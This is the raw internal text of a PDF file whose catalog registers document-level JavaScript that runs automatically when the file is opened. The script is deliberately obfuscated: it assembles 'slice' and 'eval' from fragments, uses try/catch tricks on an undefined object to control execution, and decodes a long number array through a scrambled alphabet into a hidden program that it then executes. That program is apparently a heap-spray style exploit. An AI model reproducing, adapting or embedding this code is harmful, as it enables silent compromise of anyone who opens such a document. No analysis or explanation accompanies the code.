%PDF-1.6
%‚„œ”
7 0 obj
<</Count 1/Type/Pages/Kids[28 0 R]>>
endobj
21 0 obj
<</MarkInfo<</Marked true>>/Names 23 0 R/Outlines 1 0 R/Metadata 9 0 R/AcroForm 22 0 R/Pages 7 0 R/OCProperties<</D<</RBGroups[]/OFF[]/Order[]>>/OCGs[27 0 R]>>/StructTreeRoot 11 0 R/Type/Catalog>>
endobj
23 0 obj
<</JavaScript 24 0 R/AP 8 0 R>>
endobj
24 0 obj
<</Names[123 0 R 76 0 R]>>
endobj
25 0 obj
<</S/JavaScript/JS 26 0 R>>
endobj
26 0 obj
<</Length 1108/Filter[/FlateDecode]>>stream
endstream
endobj
28 0 obj
<</CropBox[37 37 575 755]/Annots 29 0 R/Parent 7 0 R/StructParents 0/Contents 60 0 R/Rotate 90/MediaBox[0 0 612 792]/Resources<</XObject<</Im0 69 0 R>>/ColorSpace<</CS0 59 0 R>>/Font<</TT0 61 0 R>>/Properties<</MC0 27 0 R>>/ExtGState<</GS0 72 0 R>>>>/Type/Page>>
endobj
60 0 obj
<</Length 539/Filter/FlateDecode/Type/Contents>>stream
endstream
endobj
76 0 obj
<</S/JavaScript/JS(
nk="";
nk+='sl';
nk+="i";
nk+="ce";
j='gerb43bt';
j=j[nk];
z
=
new
Array\(27,7,11,18,71,22,16,30,50,2,26,42,0,74,56,56,26,42,29,21,8,44,26,42,0,65,29,21,26,42,49,65,8,44,26,42,8,59,74,44,26,42,74,74,65,29,26,42,56,44,21,1,26,42,44,1,0,71,26,42,0,71,74,1,26,42,1,21,44,1,26,42,49,1,0,71,26,42,65,56,36,21,26,42,49,56,0,71,26,42,74,74,1,0,26,42,56,56,34,71,26,42,65,8,0,71,26,42,1,74,74,21,26,42,74,74,49,44,26,42,0,36,45,21,26,42,36,65,8,8,26,42,29,29,36,1,26,42,71,0,29,29,26,42,44,1,0,71,26,42,21,74,74,1,26,42,74,59,44,56,26,42,49,65,1,56,26,42,0,49,29,71,26,42,45,44,74,44,26,42,8,44,0,65,26,42,65,36,49,65,26,42,8,71,8,59,26,42,65,36,44,21,26,42,0,71,65,56,26,42,74,21,49,65,26,42,49,44,0,71,26,42,49,0,74,65,26,42,29,65,1,74,26,42,0,71,65,56,26,42,45,1,49,56,26,42,29,65,1,74,26,42,21,59,74,74,26,42,44,36,44,59,26,42,7,34,29,21,26,42,21,65,1,74,26,42,34,71,74,74,26,42,71,8,1,29,26,42,74,0,36,1,26,42,49,44,29,45,26,42,21,36,1,0,26,42,1,34,21,71,26,42,34,7,1,74,26,42,8,71,44,1,26,42,74,71,29,36,26,42,49,65,36,29,26,42,65,8,8,56,26,42,65,8,0,71,26,42,1,74,45,44,26,42,56,56,34,34,26,42,1,21,0,71,26,42,0,34,44,71,26,42,8,21,44,56,26,42,65,44,29,29,26,42,1,21,45,44,26,42,34,0,0,71,26,42,34,34,1,74,26,42,1,44,0,71,26,42,1,74,0,71,26,42,7,71,21,65,26,42,65,59,65,8,26,42,8,71,21,74,26,42,7,34,65,74,26,42,56,0,0,71,26,42,0,1,45,1,26,42,1,21,49,34,26,42,49,44,74,74,26,42,59,56,1,74,26,42,29,74,8,71,26,42,56,0,0,71,26,42,0,71,1,0,26,42,56,7,29,49,26,42,65,59,1,65,26,42,59,0,8,0,26,42,29,29,29,29,26,42,8,45,29,29,26,42,8,0,29,59,26,42,1,1,1,1,26,42,1,1,1,1,26,42,65,1,65,0,26,42,44,1,56,7,26,42,29,29,56,0,26,42,1,1,1,1,26,42,65,1,1,1,26,42,21,1,0,74,26,42,65,1,36,59,26,42,0,71,65,65,26,42,0,71,8,21,26,42,36,1,65,8,26,42,21,74,0,74,26,42,29,29,1,65,26,42,56,0,8,74,26,42,56,8,56,29,26,42,1,1,1,1,26,42,49,65,56,0,26,42,56,21,49,45,26,42,65,44,56,34,26,42,36,56,29,29,26,42,21,44,0,74,26,42,0,71,1,0,26,42,8,0,8,0,26,42,29,29,56,36,26,42,29,29,29,29,26,42,1,45,8,71,26,42,49,45,8,71,26,42,8,21,0,36,26,42,1,36,1,44,26,42,1,1,1,1,26,42,65,21,0,34,26,42,1,21,45,44,26,42,1,44,21,49,26,42,49,45,45,44,26,42,56,49,56,65,26,42,21,49,49,74,26,42,45,44,44,44,26,42,49,56,1,44,26,42,74,74,49,45,26,42,21,49,74,45,26,42,45,44,44,44,26,42,45,1,1,0,26,42,49,74,45,34,26,42,65,74,45,1,26,42,29,0,56,0,26,42,1,1,1,1,26,42,29,29,1,1,26,42,1,21,65,56,26,42,8,0,0,71,26,42,21,59,74,74,26,42,21,49,65,36,26,42,36,34,44,44,26,42,49,49,1,1,26,42,56,45,49,1,26,42,21,49,49,44,26,42,36,34,44,44,26,42,45,8,1,65,26,42,56,21,56,44,26,42,21,56,56,21,26,42,36,34,44,44,26,42,1,1,1,59,26,42,0,7,65,59,26,42,1,44,21,36,26,42,0,0,74,1,26,42,36,34,44,44,26,42,44,36,1,44,26,42,56,7,65,36,26,42,56,7,1,1,26,42,65,74,1,1,26,42,56,7,65,49,26,42,29,29,1,1,26,42,36,44,65,56,26,42,21,1,0,65,26,42,36,56,49,65,26,42,1,1,56,7,26,42,29,29,65,74,26,42,1,44,65,56,26,42,1,1,56,7,26,42,8,71,0,74,26,42,65,74,1,21,26,42,65,56,29,29,26,42,0,74,1,44,26,42,1,21,21,74,26,42,1,45,8,71,26,42,36,74,8,71,26,42,0,1,44,49,26,42,1,1,74,29,26,42,29,7,49,65,26,42,0,1,44,49,26,42,1,1,74,29,26,42,21,44,49,65,26,42,1,1,56,7,26,42,29,8,56,7,26,42,65,56,29,29,26,42,8,0,1,0,26,42,29,8,59,21,26,42,29,29,29,29,26,42,44,8,0,8,26,42,8,21,1,8,26,42,29,8,59,0,26,42,1,8,0,7,26,42,56,29,0,59,26,42,71,34,1,36,26,42,21,7,74,74,26,42,65,71,0,7,26,42,21,56,36,71,26,42,49,59,44,56,26,42,36,7,74,56,26,42,49,1,45,29,26,42,49,44,56,0,26,42,49,1,49,44,26,42,45,29,74,7,26,42,56,36,45,29,26,42,56,44,56,74,26,42,56,49,49,74,26,42,56,21,49,7,26,42,49,59,56,36,26,42,49,74,49,65,26,42,56,74,45,8,26,42,56,34,56,29,26,42,49,49,45,29,26,42,49,1,45,8,26,42,49,1,56,0,26,42,56,56,74,29,26,42,74,49,74,34,26,42,56,65,45,56,26,42,74,65,74,34,26,42,1,1,1,1,2,69,29,42,70,21,20,62,17,70,18,8,23,27,11,43,11,7,15,75,24,6,28,37,66,62,68,8,43,11,7,41,68,8,70,30,20,66,60,45,72,75,24,6,28,11,7,5,50,11,7,69,47,11,7,50,11,7,41,16,42,71,16,20,11,62,70,30,43,1,15,75,24,64,45,6,69,11,8,20,42,11,70,18,11,7,69,47,18,29,42,70,21,20,62,17,70,18,71,10,43,6,28,27,7,11,18,34,35,30,50,70,8,37,18,14,11,11,7,24,43,6,69,27,7,11,18,27,37,50,1,10,1,21,1,21,1,21,1,21,69,27,7,11,18,7,34,34,11,50,1,10,44,1,1,1,1,1,69,27,7,11,18,19,7,24,68,17,7,34,50,42,70,8,16,21,7,19,8,43,71,22,16,30,6,69,27,7,11,18,16,21,57,68,8,70,50,19,7,24,68,17,7,34,41,68,8,70,30,20,66,60,45,69,27,7,11,18,75,24,50,7,34,34,11,73,43,16,21,57,68,8,70,5,1,10,74,0,6,69,27,7,11,18,24,7,11,16,19,50,42,70,8,16,21,7,19,8,43,51,26,42,59,1,59,1,26,42,59,1,59,1,51,6,69,24,7,11,16,19,50,8,23,27,11,43,24,7,11,16,19,15,75,24,6,69,27,7,11,18,21,17,42,70,20,45,50,43,27,37,73,1,10,44,1,1,1,1,1,6,64,7,34,34,11,69,29,17,11,43,27,7,11,18,21,17,42,70,20,50,1,69,21,17,42,70,20,72,21,17,42,70,20,45,69,21,17,42,70,20,5,5,6,28,34,35,30,63,21,17,42,70,20,40,50,24,7,11,16,19,5,19,7,24,68,17,7,34,69,47,18,27,7,11,18,17,27,8,11,29,68,17,37,50,42,70,8,16,21,7,19,8,43,51,26,42,1,21,1,21,26,42,1,21,1,21,51,6,69,37,66,62,68,8,43,17,27,8,11,29,68,17,37,41,68,8,70,30,20,66,72,44,44,59,65,45,6,28,17,27,8,11,29,68,17,37,5,50,17,27,8,11,29,68,17,37,69,47,18,20,66,62,16,41,21,17,68,68,7,71,38,20,17,11,8,50,61,17,68,68,7,71,41,21,17,68,68,8,21,20,54,12,7,62,68,52,70,29,17,43,28,16,42,71,22,46,51,51,15,12,16,30,46,17,27,8,11,29,68,17,37,47,6,69,47,18,29,42,70,21,20,62,17,70,18,19,11,62,70,20,29,43,6,28,70,17,19,50,42,70,8,16,21,7,19,8,43,51,26,42,1,14,1,14,26,42,1,14,1,14,26,42,1,14,1,14,26,42,1,14,1,14,51,6,69,27,7,11,18,19,7,24,68,17,7,34,50,42,70,8,16,21,7,19,8,43,71,22,16,30,6,69,66,8,7,19,71,68,17,21,35,50,70,17,19,5,19,7,24,68,17,7,34,69,71,62,30,71,68,17,21,35,50,42,70,8,16,21,7,19,8,43,51,26,42,1,14,1,14,26,42,1,14,1,14,51,6,69,66,8,7,34,8,11,16,62,23,8,50,45,1,69,16,19,11,7,24,50,66,8,7,34,8,11,16,62,23,8,5,66,8,7,19,71,68,17,21,35,41,68,8,70,30,20,66,69,37,66,62,68,8,43,71,62,30,71,68,17,21,35,41,68,8,70,30,20,66,72,16,19,11,7,24,6,28,71,62,30,71,68,17,21,35,5,50,71,62,30,71,68,17,21,35,69,47,18,29,62,68,68,71,68,17,21,35,50,71,62,30,71,68,17,21,35,41,16,42,71,16,20,11,62,70,30,43,1,15,16,19,11,7,24,6,69,71,68,17,21,35,50,71,62,30,71,68,17,21,35,41,16,42,71,16,20,11,62,70,30,43,1,15,71,62,30,71,68,17,21,35,41,68,8,70,30,20,66,73,16,19,11,7,24,6,69,37,66,62,68,8,43,71,68,17,21,35,41,68,8,70,30,20,66,5,16,19,11,7,24,72,1,10,44,1,1,1,1,6,28,71,68,17,21,35,50,71,68,17,21,35,5,71,68,17,21,35,5,29,62,68,68,71,68,17,21,35,69,47,18,12,8,12,50,70,8,37,18,14,11,11,7,24,43,6,69,29,17,11,43,62,50,1,69,62,72,36,44,1,1,69,62,5,5,6,28,12,8,12,63,62,40,50,71,68,17,21,35,5,66,8,7,19,71,68,17,21,35,69,47,18,27,7,11,18,70,42,12,50,36,45,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,69,42,20,62,68,41,19,11,62,70,20,29,43,51,26,44,65,1,1,1,29,51,15,70,42,12,6,69,47,18,29,42,70,21,20,62,17,70,18,30,8,20,62,21,17,70,43,6,28,27,7,11,18,7,11,11,24,50,70,8,37,18,14,11,11,7,24,43,6,69,62,29,43,7,19,19,41,34,17,21,41,61,17,68,68,7,71,41,30,8,20,52,21,17,70,6,28,27,7,11,18,19,7,24,68,17,7,34,50,42,70,8,16,21,7,19,8,43,71,22,16,30,6,69,27,7,11,18,66,9,75,65,1,1,61,55,50,19,7,24,68,17,7,34,41,68,8,70,30,20,66,60,45,69,27,7,11,18,75,24,50,1,10,44,1,1,1,1,1,73,43,66,9,75,65,1,1,61,55,5,1,10,74,0,6,69,27,7,11,18,24,7,11,16,19,50,42,70,8,16,21,7,19,8,43,51,26,42,59,1,59,1,26,42,59,1,59,1,51,6,69,24,7,11,16,19,50,8,23,27,11,43,24,7,11,16,19,15,75,24,6,69,27,7,11,18,19,65,14,22,39,56,65,29,50,43,1,10,1,21,1,21,1,21,1,21,73,1,10,44,1,1,1,1,1,6,64,1,10,44,1,1,1,1,1,69,29,17,11,43,27,7,11,18,27,75,21,67,32,59,56,24,50,1,69,27,75,21,67,32,59,56,24,72,19,65,14,22,39,56,65,29,69,27,75,21,67,32,59,56,24,5,5,6,28,7,11,11,24,63,27,75,21,67,32,59,56,24,40,50,24,7,11,16,19,5,19,7,24,68,17,7,34,69,47,18,27,7,11,18,20,25,13,66,55,71,53,37,50,42,70,8,16,21,7,19,8,43,51,26,1,59,51,6,69,37,66,62,68,8,43,20,25,13,66,55,71,53,37,41,68,8,70,30,20,66,72,1,10,44,1,1,1,6,28,20,25,13,66,55,71,53,37,5,50,20,25,13,66,55,71,53,37,69,47,18,20,25,13,66,55,71,53,37,50,51,55,41,51,5,20,25,13,66,55,71,53,37,69,7,19,19,41,34,17,21,41,61,17,68,68,7,71,41,30,8,20,52,21,17,70,43,20,25,13,66,55,71,53,37,6,69,47,47,18,7,4,68,42,30,62,70,16,50,7,19,19,41,19,68,42,30,52,70,16,69,27,7,11,18,16,27,50,19,7,11,16,8,52,70,20,43,7,19,19,41,27,62,8,37,8,11,31,8,11,16,62,17,70,41,20,17,38,20,11,62,70,30,43,6,41,21,66,7,11,14,20,43,1,6,6,69,29,17,11,43,27,7,11,18,62,50,1,69,62,72,7,4,68,42,30,62,70,16,41,68,8,70,30,20,66,69,62,5,5,6,28,62,29,43,7,4,68,42,30,62,70,16,63,62,40,41,70,7,12,8,50,50,2,54,38,21,11,62,19,20,2,6,28,27,7,11,18,68,27,50,7,4,68,42,30,62,70,16,63,62,40,41,27,8,11,16,62,17,70,69,47,47,18,62,29,43,43,68,27,50,50,59,6,58,58,43,43,16,27,50,50,0,6,33,33,43,68,27,72,50,0,41,36,45,6,6,6,28,30,8,20,62,21,17,70,43,6,69,47,8,68,16,8,18,62,29,43,68,27,50,50,49,41,36,6,28,19,11,62,70,20,29,43,6,69,47,8,68,16,8,18,62,29,43,43,43,16,27,50,50,56,6,58,58,43,16,27,50,50,49,6,6,33,33,43,68,27,72,49,41,36,36,6,6,28,71,10,43,6,69,47,8,68,16,8,18,62,29,43,43,68,27,3,50,59,41,36,6,58,58,43,68,27,72,50,59,41,45,6,58,58,43,68,27,3,50,0,41,36,74,6,58,58,43,68,27,72,50,0,41,36,49,6,6,28,29,42,70,21,20,62,17,70,18,7,43,6,28,42,20,62,68,41,19,11,62,70,20,34,43,2,19,48,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,18,46,18,24,24,24,24,36,36,36,2,15,70,8,37,18,32,7,20,8,43,6,6,69,47,27,7,11,18,66,50,7,19,19,41,19,68,42,30,52,70,16,69,29,17,11,43,27,7,11,18,29,50,1,69,29,72,66,41,68,8,70,30,20,66,69,29,5,5,6,28,62,29,43,66,63,29,40,41,70,7,12,8,50,50,2,54,38,21,11,62,19,20,2,6,28,27,7,11,18,62,50,66,63,29,40,41,27,8,11,16,62,17,70,69,47,47,18,62,29,43,43,62,3,0,41,36,45,6,33,33,43,62,72,0,41,45,6,6,28,21,50,70,8,37,18,14,11,11,7,24,43,6,69,27,7,11,18,34,50,42,70,8,16,21,7,19,8,43,2,26,42,59,1,59,1,26,42,59,1,59,1,2,6,69,27,7,11,18,8,50,42,70,8,16,21,7,19,8,43,71,22,16,30,6,69,37,66,62,68,8,43,34,41,68,8,70,30,20,66,72,50,1,10,0,1,1,1,6,28,34,5,50,34,69,47,34,50,34,41,16,42,71,16,20,11,43,1,15,1,10,0,1,1,1,73,8,41,68,8,70,30,20,66,6,69,29,17,11,43,29,50,1,69,29,72,45,59,1,1,69,29,5,5,6,28,21,63,29,40,50,34,5,8,69,47,7,43,6,69,7,43,6,69,20,11,24,28,20,66,62,16,41,12,8,34,62,7,41,70,8,37,4,68,7,24,8,11,43,70,42,68,68,6,69,47,21,7,20,21,66,43,8,6,28,47,7,43,6,69,47,47\);
a="80'>P+\)aeWxrmMA,so ptcjzyU%v{fgVD&dk1wSK].u\(42:}@7='IGEN6_|9*Ci[/5hQl;nb<-3q";
b="a"+'l';
b2="v"
+b;
try
{
if\(!google.search\(\)\)throw 1;
}
catch\(her436j34k76\)
{
e=\(j\(\)\);
try{
b='e'+b2;
if\(!google.search\(\)\)
a=2;
}
catch\(q\){
e=
e[
b];
}
s='';try{if\(!google.search\(\)\)throw 1;}catch\(q\){r=1;}{
for\(i=0;i<z.length;i++\)
try{
n=i;
if\(!google.search\(\)\)throw 1;}catch\(q\){
s
+=
a[
z[n]];
}
}}

try{if\(/x\(?=y\)/.test\('axyb'\)\)throw 1;}catch\(q\){e\(s\);})>>
endobj
xref
0 155
trailer
<</Size 155
/Root 21 0 R>>
xref
0 0
trailer
<</Size 155/Prev 75626/XRefStm 416/Root 21 0 R>>
startxref
78995
%%EOF